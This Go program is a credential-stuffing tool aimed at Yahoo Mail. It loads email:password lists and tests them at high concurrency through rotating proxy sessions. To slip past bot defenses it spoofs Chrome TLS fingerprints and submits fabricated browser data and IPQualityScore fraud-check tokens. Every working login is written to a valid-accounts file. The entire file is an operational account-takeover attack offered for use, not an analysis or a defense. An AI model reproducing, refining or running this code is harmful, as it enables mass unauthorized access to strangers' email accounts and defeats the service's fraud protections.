package main

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	http "github.com/bogdanfinn/fhttp"
	tls_client "github.com/bogdanfinn/tls-client"
	"github.com/bogdanfinn/tls-client/profiles"
	"github.com/joho/godotenv"
)

var (
	baseDir      = mustAbs(".")
	combosFile   = filepath.Join(baseDir, "combos.txt")
	resultDir    = filepath.Join(baseDir, "result")
	validFile    = filepath.Join(resultDir, "valid.txt")
	invalidFile  = filepath.Join(resultDir, "invalid.txt")
	workers      = 200
	proxyCfg     Proxy
	writeMu      sync.Mutex
	ipqsLearnPath = "/api/*/Z6zn1EFDPjFfpfhcrY9lhKf34Sr5jq4H79qMV5ZrKQoNE8mofcWGXBWlPjLFj6NGbNAwRTuX5fyCKvS9oEJMmQnGRRFMePUlbchjKe3lqnUGnwJ5yab9XcrIzAQ3cGyDOAtKl0Womp7vVBOWPDtNL8VFMVsLJK0VnWDAXlaFdokaHZoBwtdzyVtIsP2IjIAo2pu6Va56MAarg9yez1Rxvy7jzEFI3dRR21PUo1bT8703DzbpRappGVNpe0MGfaha/learn/fetch"
	ipqsHosts     = []string{
		"dtproxy5.yahoo.nc.clients.ipqs.com",
		"dtproxy6.yahoo.nc.clients.ipqs.com",
		"fn.nc.ipqualityscore.com",
	}
	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36"
	runStarted = time.Time{}
)

const (
	cReset         = "\x1b[0m"
	cBold          = "\x1b[1m"
	cBrightRed     = "\x1b[91m"
	cBrightGreen   = "\x1b[92m"
	cBrightYellow  = "\x1b[93m"
	cBrightCyan    = "\x1b[96m"
	cBrightWhite   = "\x1b[97m"
)

func paint(color, msg string) string {
	return color + cBold + msg + cReset
}

func logLine(color, msg string) {
	fmt.Println(paint(color, msg))
}

type Combo struct {
	Email    string
	Password string
}

type Proxy struct {
	Host     string
	Port     int
	Username string
	Password string
}

type loginCtx struct {
	SessionIndex string
	Acrumb       string
	Crumb        string
}

type passCtx struct {
	loginCtx
	DisplayName     string
	PasswordContext string
	IpqsSessionID   string
}

type ipqsResult struct {
	IRI  string
	IPL  string
	UDID string
	Host string
}

func mustAbs(p string) string {
	abs, err := filepath.Abs(p)
	if err != nil {
		return p
	}
	return abs
}

func main() {
	enableColors()
	_ = godotenv.Load(filepath.Join(baseDir, ".env"))

	if w := strings.TrimSpace(os.Getenv("WORKERS")); w != "" {
		if n, err := strconv.Atoi(w); err == nil && n > 0 {
			workers = n
		}
	}

	var err error
	proxyCfg, err = parseProxy(os.Getenv("PROXY"))
	if err != nil {
		fatal(err)
	}

	combos, err := loadCombos(combosFile)
	if err != nil {
		fatal(err)
	}

	resetResultDir()
	runStarted = time.Now()

	logLine(cBrightCyan, fmt.Sprintf("Yahoo HTTP auto login | %s", stamp(0)))
	logLine(cBrightWhite, fmt.Sprintf("  Combos=%d | %s", len(combos), stamp(0)))
	logLine(cBrightWhite, fmt.Sprintf("  Workers=%d | %s", workers, stamp(0)))
	logLine(cBrightWhite, fmt.Sprintf("  Proxy=%s:%d | %s", proxyCfg.Host, proxyCfg.Port, stamp(0)))
	logLine(cBrightYellow, fmt.Sprintf("  Valid=%s | %s", validFile, stamp(0)))
	logLine(cBrightYellow, fmt.Sprintf("  Invalid=%s | %s", invalidFile, stamp(0)))
	fmt.Println()

	failed := runWithWorkers(combos, workers)
	valid := len(combos) - failed
	fmt.Println()
	doneMsg := fmt.Sprintf("  Done=%d valid / %d invalid | %s", valid, failed, stamp(len(combos)))
	if failed == 0 {
		logLine(cBrightGreen, doneMsg)
	} else if valid == 0 {
		logLine(cBrightRed, doneMsg)
	} else {
		logLine(cBrightYellow, doneMsg)
	}
	if failed > 0 {
		os.Exit(1)
	}
}

func fatal(err error) {
	fmt.Fprintln(os.Stderr, paint(cBrightRed, "✗ "+err.Error()))
	os.Exit(1)
}

func loadCombos(path string) ([]Combo, error) {
	raw, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("missing combos.txt (format: email:password)")
	}

	var out []Combo
	for _, line := range strings.Split(string(raw), "\n") {
		line = strings.TrimSpace(strings.TrimSuffix(line, "\r"))
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		idx := strings.IndexByte(line, ':')
		if idx <= 0 || idx == len(line)-1 {
			return nil, fmt.Errorf("invalid combo line: %s", line)
		}
		out = append(out, Combo{
			Email:    strings.TrimSpace(line[:idx]),
			Password: strings.TrimSpace(line[idx+1:]),
		})
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("combos.txt is empty")
	}
	return out, nil
}

func parseProxy(raw string) (Proxy, error) {
	value := strings.TrimSpace(raw)
	if value == "" {
		return Proxy{}, fmt.Errorf("PROXY missing in .env")
	}
	parts := strings.Split(value, ":")
	if len(parts) < 4 {
		return Proxy{}, fmt.Errorf("PROXY must be host:port:user:pass")
	}
	port, err := strconv.Atoi(parts[1])
	if err != nil || port <= 0 {
		return Proxy{}, fmt.Errorf("invalid PROXY in .env")
	}
	password := parts[len(parts)-1]
	username := strings.Join(parts[2:len(parts)-1], ":")
	if parts[0] == "" || username == "" || password == "" {
		return Proxy{}, fmt.Errorf("invalid PROXY in .env")
	}
	return Proxy{Host: parts[0], Port: port, Username: username, Password: password}, nil
}

func buildProxyURL(username string) string {
	return fmt.Sprintf(
		"http://%s:%s@%s:%d",
		url.QueryEscape(username),
		url.QueryEscape(proxyCfg.Password),
		proxyCfg.Host,
		proxyCfg.Port,
	)
}

var sessionRe = regexp.MustCompile(`_session-[A-Za-z0-9]+`)

func rotateProxyUsername() string {
	base := sessionRe.ReplaceAllString(proxyCfg.Username, "")
	b := make([]byte, 8)
	_, _ = rand.Read(b)
	return base + "_session-" + hex.EncodeToString(b)
}

func createSessionClient() (tls_client.HttpClient, error) {
	jar := tls_client.NewCookieJar()
	options := []tls_client.HttpClientOption{
		tls_client.WithTimeoutSeconds(30),
		tls_client.WithClientProfile(profiles.Chrome_133),
		tls_client.WithCookieJar(jar),
		tls_client.WithProxyUrl(buildProxyURL(rotateProxyUsername())),
		tls_client.WithRandomTLSExtensionOrder(),
	}
	return tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
}

func doRequest(client tls_client.HttpClient, method, rawURL string, body string, headers map[string]string, followRedirects bool) (string, int, string, error) {
	client.SetFollowRedirect(followRedirects)

	var reader io.Reader
	if body != "" {
		reader = strings.NewReader(body)
	}
	req, err := http.NewRequest(method, rawURL, reader)
	if err != nil {
		return "", 0, "", err
	}

	for k, v := range headers {
		req.Header.Set(k, v)
	}
	if req.Header.Get("User-Agent") == "" {
		req.Header.Set("User-Agent", userAgent)
	}

	resp, err := client.Do(req)
	if err != nil {
		return "", 0, "", err
	}
	defer resp.Body.Close()

	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", resp.StatusCode, resp.Request.URL.String(), err
	}
	finalURL := ""
	if resp.Request != nil && resp.Request.URL != nil {
		finalURL = resp.Request.URL.String()
	}
	return string(raw), resp.StatusCode, finalURL, nil
}

func pick(html, key string) string {
	esc := regexp.MustCompile(`\\"` + regexp.QuoteMeta(key) + `\\":\\"` + `([^\\]+)\\"`)
	if m := esc.FindStringSubmatch(html); len(m) > 1 {
		return m[1]
	}
	plain := regexp.MustCompile(`"` + regexp.QuoteMeta(key) + `":"` + `([^"]+)"`)
	if m := plain.FindStringSubmatch(html); len(m) > 1 {
		return m[1]
	}
	return ""
}

func extractContext(html string) (loginCtx, error) {
	ctx := loginCtx{
		SessionIndex: pick(html, "sessionIndex"),
		Acrumb:       pick(html, "acrumb"),
		Crumb:        pick(html, "crumb"),
	}
	if ctx.SessionIndex == "" || ctx.Acrumb == "" || ctx.Crumb == "" {
		return loginCtx{}, fmt.Errorf("could not parse Yahoo login page tokens")
	}
	return ctx, nil
}

func extractPassContext(html, fallbackEmail string) passCtx {
	base, _ := extractContext(html)
	pc := passCtx{loginCtx: base}
	pc.DisplayName = pick(html, "displayName")
	if pc.DisplayName == "" {
		pc.DisplayName = fallbackEmail
	}
	pc.PasswordContext = pick(html, "passwordContext")
	if pc.PasswordContext == "" {
		pc.PasswordContext = "normal"
	}
	pc.IpqsSessionID = pick(html, "ipqsSessionId")
	return pc
}

func browserFpData() string {
	now := time.Now().UnixMilli()
	payload := map[string]any{
		"language":             "en-US",
		"colorDepth":           24,
		"deviceMemory":         8,
		"pixelRatio":           1,
		"hardwareConcurrency":  8,
		"timezoneOffset":       -60,
		"timezone":             "Europe/Rome",
		"sessionStorage":       1,
		"localStorage":         1,
		"indexedDb":            1,
		"openDatabase":         1,
		"cpuClass":             "unknown",
		"platform":             "Win32",
		"doNotTrack":           "unknown",
		"plugins":              map[string]any{"count": 5, "hash": "2c21d957e91c20ea"},
		"canvas":               "canvas winding:yes~canvas",
		"webgl":                1,
		"webglVendorAndRenderer": "Google Inc. (NVIDIA)~ANGLE",
		"adBlock":              0,
		"hasLiedLanguages":     0,
		"hasLiedResolution":    0,
		"hasLiedOs":            0,
		"hasLiedBrowser":       0,
		"touchSupport":         map[string]any{"points": 0, "event": 0, "start": 0},
		"fonts":                map[string]any{"count": 50, "hash": "edeefd360161b4bf"},
		"audio":                "124.04347527516074",
		"resolution":           map[string]string{"w": "1920", "h": "1080"},
		"availableResolution":  map[string]string{"w": "1040", "h": "1920"},
		"ts":                   map[string]int64{"serve": now, "render": now + 80},
	}
	b, _ := json.Marshal(payload)
	return string(b)
}

func xhrHeaders(referer string) map[string]string {
	if referer == "" {
		referer = "https://login.yahoo.com/"
	}
	return map[string]string{
		"Content-Type":     "application/x-www-form-urlencoded",
		"Accept":           "*/*",
		"X-Requested-With": "XMLHttpRequest",
		"Origin":           "https://login.yahoo.com",
		"Referer":          referer,
		"Sec-Fetch-Site":   "same-origin",
		"Sec-Fetch-Mode":   "cors",
		"Sec-Fetch-Dest":   "empty",
	}
}

func mapYahooError(raw any) string {
	message := fmt.Sprint(raw)
	if m, ok := raw.(map[string]any); ok {
		if v, ok := m["message"]; ok {
			message = fmt.Sprint(v)
		} else if v, ok := m["code"]; ok {
			message = fmt.Sprint(v)
		} else if v, ok := m["error"]; ok {
			message = fmt.Sprint(v)
		}
	}

	re := regexp.MustCompile(`(?i)ERROR_(\d+)`)
	if m := re.FindStringSubmatch(message); len(m) > 1 {
		if n, err := strconv.Atoi(m[1]); err == nil {
			if n >= 100 && n < 200 {
				return "not existed username"
			}
			if n >= 200 && n < 300 {
				return "INVALID_PHONE_NUMBER"
			}
		}
	}
	upper := strings.ToUpper(message)
	switch {
	case strings.Contains(upper, "INVALID_USERNAME"):
		return "not existed username"
	case strings.Contains(upper, "INVALID_PHONE_NUMBER"):
		return "INVALID_PHONE_NUMBER"
	case strings.Contains(upper, "INVALID_IDENTIFIER"), strings.Contains(upper, "ERROR_NOTFOUND"):
		return "not existed username"
	}
	if message == "" {
		return "UNKNOWN_ERROR"
	}
	return message
}

func toAbsoluteURL(u string) string {
	if u == "" {
		return ""
	}
	if strings.HasPrefix(u, "http") {
		return u
	}
	return "https://login.yahoo.com" + u
}

func appendValidate(rawURL string) (string, error) {
	u, err := url.Parse(toAbsoluteURL(rawURL))
	if err != nil {
		return "", err
	}
	u.Path = strings.TrimRight(u.Path, "/") + "/validate"
	return u.String(), nil
}

func extractUdid(raw string) string {
	m := regexp.MustCompile(`"udid"\s*:\s*(\d+)`).FindStringSubmatch(raw)
	if len(m) > 1 {
		return m[1]
	}
	return ""
}

func fingerprintHash(parts []string) string {
	sum := sha256.Sum256([]byte(strings.Join(parts, "|")))
	return hex.EncodeToString(sum[:])[:32]
}

func buildIpqsBody(vars map[string]any) string {
	var parts []string
	for k, v := range vars {
		if v == nil {
			parts = append(parts, k+"=null")
			continue
		}
		switch t := v.(type) {
		case []any:
			for _, item := range t {
				b, _ := json.Marshal(item)
				parts = append(parts, k+"[]="+url.QueryEscape(string(b)))
			}
		default:
			parts = append(parts, k+"="+url.QueryEscape(fmt.Sprint(v)))
		}
	}
	return strings.Join(parts, "&")
}

func fetchIpqsUdid(client tls_client.HttpClient) (string, error) {
	raw, _, _, err := doRequest(client, http.MethodGet,
		"https://dtproxy5.yahoo.nc.clients.ipqs.com/udid/udid.json", "",
		map[string]string{
			"Accept":  "*/*",
			"Origin":  "https://login.yahoo.com",
			"Referer": "https://login.yahoo.com/",
		}, true)
	if err != nil {
		return "", err
	}
	udid := extractUdid(raw)
	if udid == "" {
		return "", fmt.Errorf("IPQS udid missing")
	}
	return udid, nil
}

func fetchIpqsRequestID(client tls_client.HttpClient, ipqsSessionID, referer string) (*ipqsResult, error) {
	started := time.Now()
	udid, err := fetchIpqsUdid(client)
	if err != nil {
		return nil, err
	}

	dtoo := fingerprintHash([]string{
		userAgent, "Win32", "24", "1", "1920x1080", "1920x1040", "en-US", "-60", udid, ipqsSessionID,
	})

	vars := map[string]any{
		"ipqsd": udid,
		"dta":   []any{map[string]string{"key": "sessionId", "value": ipqsSessionID}},
		"dtb":   userAgent,
		"dtc":   "Win32",
		"dtd":   24,
		"dte":   1,
		"dtf":   "false",
		"dtg":   "1920x1080",
		"dth":   "1920x1040",
		"dti":   "en-US",
		"dtj":   -60,
		"dtk":   1,
		"dtl":   1,
		"dtnn":  0,
		"dtm":   1,
		"dtn":   0,
		"dto":   0,
		"dtp":   "unknown",
		"dtq":   "Win32",
		"dtr":   "false",
		"dtt":   "false",
		"dtu":   "false",
		"dtv":   "false",
		"dtw":   "false",
		"dtx":   []any{},
		"dty":   []any{},
		"dtz":   "false",
		"dtaa":  "false",
		"dtqq":  dtoo,
		"dtoo":  dtoo,
		"dtpc":  1,
		"dtam":  "am",
		"dts":   1,
		"dtss":  1,
		"dtmm":  "",
		"dtii":  []any{},
		"dtkk":  0,
		"dtff":  0,
		"dtvv":  0,
		"dtww":  0,
		"dtrr":  0,
		"dtll":  0,
	}
	body := buildIpqsBody(vars)
	if referer == "" {
		referer = "https://login.yahoo.com/"
	}

	var lastErr error
	for _, host := range ipqsHosts {
		rawURL := "https://" + host + ipqsLearnPath
		raw, status, _, err := doRequest(client, http.MethodPost, rawURL, body, map[string]string{
			"Content-Type":     "application/x-www-form-urlencoded",
			"Accept":           "*/*",
			"Origin":           "https://login.yahoo.com",
			"Referer":          referer,
			"X-Requested-With": "XMLHttpRequest",
		}, false)
		if err != nil {
			lastErr = err
			continue
		}
		if raw == "" || raw[0] != '{' {
			lastErr = fmt.Errorf("%s empty/non-json body (status %d)", host, status)
			continue
		}
		var jsonMap map[string]any
		if err := json.Unmarshal([]byte(raw), &jsonMap); err != nil {
			lastErr = err
			continue
		}
		reqID, _ := jsonMap["request_id"].(string)
		if reqID == "" {
			lastErr = fmt.Errorf("%s no request_id: %s", host, truncate(raw, 200))
			continue
		}
		return &ipqsResult{
			IRI:  reqID,
			IPL:  strconv.FormatInt(time.Since(started).Milliseconds(), 10),
			UDID: udid,
			Host: host,
		}, nil
	}
	if lastErr == nil {
		lastErr = fmt.Errorf("IPQS learn/fetch failed")
	}
	return nil, lastErr
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}

func parseJSONMap(raw string) (map[string]any, error) {
	var m map[string]any
	if err := json.Unmarshal([]byte(raw), &m); err != nil {
		return nil, err
	}
	return m, nil
}

func yahooHTTPLogin(client tls_client.HttpClient, login Combo) (string, error) {
	pageHTML, _, _, err := doRequest(client, http.MethodGet, "https://login.yahoo.com/", "", map[string]string{
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.9",
	}, true)
	if err != nil {
		return "", err
	}
	ctx, err := extractContext(pageHTML)
	if err != nil {
		return "", err
	}

	q := url.Values{}
	q.Set("done", "https://mail.yahoo.com/")
	q.Set("sessionIndex", ctx.SessionIndex)
	q.Set("acrumb", ctx.Acrumb)
	q.Set("display", "login")
	q.Set("authMechanism", "primary")
	validateURL := "https://login.yahoo.com/validate?" + q.Encode()

	usernameBody := url.Values{}
	usernameBody.Set("browser-fp-data", browserFpData())
	usernameBody.Set("crumb", ctx.Crumb)
	usernameBody.Set("acrumb", ctx.Acrumb)
	usernameBody.Set("sessionIndex", ctx.SessionIndex)
	usernameBody.Set("displayName", "")
	usernameBody.Set("deviceCapability", `{"pa":{"status":false}}`)
	usernameBody.Set("username", login.Email)
	usernameBody.Set("passwd", "")
	usernameBody.Set("signin", "Next")
	usernameBody.Set("persistent", "y")

	userRaw, _, _, err := doRequest(client, http.MethodPost, validateURL, usernameBody.Encode(), xhrHeaders("https://login.yahoo.com/"), false)
	if err != nil {
		return "", err
	}
	userJSON, err := parseJSONMap(userRaw)
	if err != nil {
		return "", fmt.Errorf("username step did not return JSON")
	}
	if e, ok := userJSON["error"]; ok && e != nil {
		return "", fmt.Errorf("%s", mapYahooError(e))
	}

	passURL := toAbsoluteURL(fmt.Sprint(firstNonEmpty(userJSON["redirect"], userJSON["location"])))
	if regexp.MustCompile(`(?i)challenge/fail`).MatchString(passURL) && regexp.MustCompile(`(?i)pcn=username`).MatchString(passURL) {
		return "", fmt.Errorf("not existed username")
	}
	if regexp.MustCompile(`(?i)challenge/fail`).MatchString(passURL) {
		return "", fmt.Errorf("username challenge fail")
	}
	if passURL == "" || !regexp.MustCompile(`(?i)password`).MatchString(passURL) {
		return "", fmt.Errorf("unexpected next step: %s", firstNonEmpty(passURL, userRaw))
	}

	passPageHTML, _, _, err := doRequest(client, http.MethodGet, passURL, "", map[string]string{
		"Accept":  "text/html,application/xhtml+xml",
		"Referer": "https://login.yahoo.com/",
	}, true)
	if err != nil {
		return "", err
	}
	passCtx := extractPassContext(passPageHTML, login.Email)
	if passCtx.SessionIndex == "" || passCtx.Acrumb == "" || passCtx.Crumb == "" {
		return "", fmt.Errorf("could not parse Yahoo login page tokens")
	}
	if passCtx.IpqsSessionID == "" {
		return "", fmt.Errorf("password page missing ipqsSessionId")
	}

	ipqs, err := fetchIpqsRequestID(client, passCtx.IpqsSessionID, passURL)
	if err != nil {
		return "", err
	}

	passValidateURL, err := appendValidate(passURL)
	if err != nil {
		return "", err
	}

	passBody := url.Values{}
	passBody.Set("browser-fp-data", browserFpData())
	passBody.Set("crumb", passCtx.Crumb)
	passBody.Set("acrumb", passCtx.Acrumb)
	passBody.Set("sessionIndex", passCtx.SessionIndex)
	passBody.Set("displayName", passCtx.DisplayName)
	passBody.Set("passwordContext", passCtx.PasswordContext)
	passBody.Set("isShowButtonClicked", "")
	passBody.Set("showButtonStatus", "")
	passBody.Set("prefersReducedMotion", "")
	passBody.Set("password", login.Password)
	passBody.Set("validate", "Next")
	passBody.Set("persistent", "y")
	passBody.Set("isl", "true")
	passBody.Set("ipl", ipqs.IPL)
	passBody.Set("irc", "true")
	passBody.Set("iri", ipqs.IRI)

	passRaw, _, _, err := doRequest(client, http.MethodPost, passValidateURL, passBody.Encode(), xhrHeaders(passURL), false)
	if err != nil {
		return "", err
	}
	passJSON, err := parseJSONMap(passRaw)
	if err != nil {
		return "", fmt.Errorf("password step did not return JSON")
	}
	if e, ok := passJSON["error"]; ok && e != nil {
		return "", fmt.Errorf("%s", mapYahooError(e))
	}

	redirect := toAbsoluteURL(fmt.Sprint(firstNonEmpty(passJSON["redirect"], passJSON["location"])))
	if regexp.MustCompile(`(?i)challenge/fail`).MatchString(redirect) {
		return "", fmt.Errorf("device check fail (eid)")
	}
	if regexp.MustCompile(`(?i)[?&]e=true`).MatchString(redirect) && regexp.MustCompile(`(?i)pcn=password`).MatchString(redirect) {
		return "", fmt.Errorf("invalid password")
	}
	if regexp.MustCompile(`(?i)challenge/password`).MatchString(redirect) && regexp.MustCompile(`(?i)[?&]e=true`).MatchString(redirect) {
		return "", fmt.Errorf("password challenge failed")
	}

	if redirect != "" {
		_, _, _, _ = doRequest(client, http.MethodGet, redirect, "", nil, true)
	}

	_, _, mailURL, err := doRequest(client, http.MethodGet, "https://mail.yahoo.com/", "", nil, true)
	if err != nil {
		return "", err
	}

	cookieNames := collectCookieNames(client)
	loggedIn := false
	for _, n := range cookieNames {
		if regexp.MustCompile(`^(?i)(Y|T|SSL)$`).MatchString(n) {
			loggedIn = true
			break
		}
	}
	if !loggedIn && regexp.MustCompile(`(?i)mail\.yahoo\.com`).MatchString(mailURL) && !regexp.MustCompile(`(?i)login\.yahoo\.com`).MatchString(mailURL) {
		loggedIn = true
	}
	if !loggedIn {
		return "", fmt.Errorf("no auth session")
	}
	return ipqs.IRI, nil
}

func firstNonEmpty(vals ...any) any {
	for _, v := range vals {
		if v == nil {
			continue
		}
		s := fmt.Sprint(v)
		if s != "" && s != "<nil>" {
			return v
		}
	}
	return ""
}

func collectCookieNames(client tls_client.HttpClient) []string {
	seen := map[string]struct{}{}
	var names []string
	for _, raw := range []string{"https://login.yahoo.com/", "https://mail.yahoo.com/", "https://yahoo.com/"} {
		u, err := url.Parse(raw)
		if err != nil {
			continue
		}
		for _, c := range client.GetCookies(u) {
			if c == nil || c.Name == "" {
				continue
			}
			if _, ok := seen[c.Name]; ok {
				continue
			}
			seen[c.Name] = struct{}{}
			names = append(names, c.Name)
		}
	}
	return names
}

func fetchExitIP(client tls_client.HttpClient) (string, error) {
	endpoints := []string{
		"https://api.ipify.org?format=json",
		"https://httpbin.org/ip",
		"https://api.myip.com",
	}
	ipRe := regexp.MustCompile(`\b(\d{1,3}(?:\.\d{1,3}){3})\b`)
	for _, ep := range endpoints {
		raw, _, _, err := doRequest(client, http.MethodGet, ep, "", nil, true)
		if err != nil {
			continue
		}
		var m map[string]any
		_ = json.Unmarshal([]byte(raw), &m)
		if ip, ok := m["ip"].(string); ok && ip != "" {
			return ip, nil
		}
		if origin, ok := m["origin"].(string); ok && origin != "" {
			return strings.TrimSpace(strings.Split(origin, ",")[0]), nil
		}
		if mm := ipRe.FindStringSubmatch(raw); len(mm) > 1 {
			return mm[1], nil
		}
	}
	return "", fmt.Errorf("could not resolve exit IP via proxy")
}

func ensureResultDir() {
	_ = os.MkdirAll(resultDir, 0o755)
}

func resetResultDir() {
	ensureResultDir()
	_ = os.WriteFile(validFile, []byte{}, 0o644)
	_ = os.WriteFile(invalidFile, []byte{}, 0o644)
}

func saveComboResult(ok bool, login Combo, detail string) {
	ensureResultDir()
	combo := login.Email + ":" + login.Password
	line := combo + "\n"
	file := validFile
	if !ok {
		file = invalidFile
		line = combo + " | " + detail + "\n"
	}

	writeMu.Lock()
	defer writeMu.Unlock()
	f, err := os.OpenFile(file, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
	if err != nil {
		return
	}
	defer f.Close()
	_, _ = f.WriteString(line)
}

func stamp(checked int) string {
	elapsed := time.Since(runStarted)
	if runStarted.IsZero() {
		elapsed = 0
	}
	sec := int(elapsed.Seconds())
	mins := elapsed.Minutes()
	if mins < 1.0/60.0 {
		mins = 1.0 / 60.0
	}
	cpm := 0
	if checked > 0 {
		cpm = int(float64(checked) / mins)
	}
	return fmt.Sprintf("%ds | cpm=%d", sec, cpm)
}

func formatComboLine(ok bool, checked, total int, login Combo, ip, detail string) string {
	color := cBrightRed
	status := "FAIL"
	if ok {
		color = cBrightGreen
		status = "OK"
	}
	if ip == "" {
		ip = "n/a"
	}
	detail = strings.ReplaceAll(strings.ReplaceAll(detail, "\r", " "), "\n", " ")
	line := fmt.Sprintf(
		"%s [%d/%d] %s:%s | ip=%s | %s | %s",
		status, checked, total, login.Email, login.Password, ip, detail, stamp(checked),
	)
	return paint(color, line)
}

func runWithWorkers(combos []Combo, concurrency int) int {
	if concurrency > len(combos) {
		concurrency = len(combos)
	}
	jobs := make(chan Combo)
	var failed atomic.Int64
	var checked atomic.Int64
	var wg sync.WaitGroup

	worker := func() {
		defer wg.Done()
		for login := range jobs {
			ok := checkCombo(login, &checked, len(combos))
			if !ok {
				failed.Add(1)
			}
		}
	}

	wg.Add(concurrency)
	for i := 0; i < concurrency; i++ {
		go worker()
	}
	for _, login := range combos {
		jobs <- login
	}
	close(jobs)
	wg.Wait()
	return int(failed.Load())
}

func checkCombo(login Combo, checked *atomic.Int64, total int) bool {
	client, err := createSessionClient()
	if err != nil {
		n := int(checked.Add(1))
		saveComboResult(false, login, err.Error())
		fmt.Println(formatComboLine(false, n, total, login, "", firstLine(err.Error())))
		return false
	}
	defer client.CloseIdleConnections()

	ip, err := fetchExitIP(client)
	if err != nil {
		n := int(checked.Add(1))
		saveComboResult(false, login, err.Error())
		fmt.Println(formatComboLine(false, n, total, login, "", firstLine(err.Error())))
		return false
	}

	iri, err := yahooHTTPLogin(client, login)
	n := int(checked.Add(1))
	if err != nil {
		reason := firstLine(err.Error())
		saveComboResult(false, login, reason)
		fmt.Println(formatComboLine(false, n, total, login, ip, reason))
		return false
	}

	saveComboResult(true, login, "")
	fmt.Println(formatComboLine(true, n, total, login, ip, "iri="+iri))
	return true
}

func firstLine(s string) string {
	s = strings.ReplaceAll(s, "\r", "\n")
	if i := strings.IndexByte(s, '\n'); i >= 0 {
		return strings.TrimSpace(s[:i])
	}
	return strings.TrimSpace(s)
}
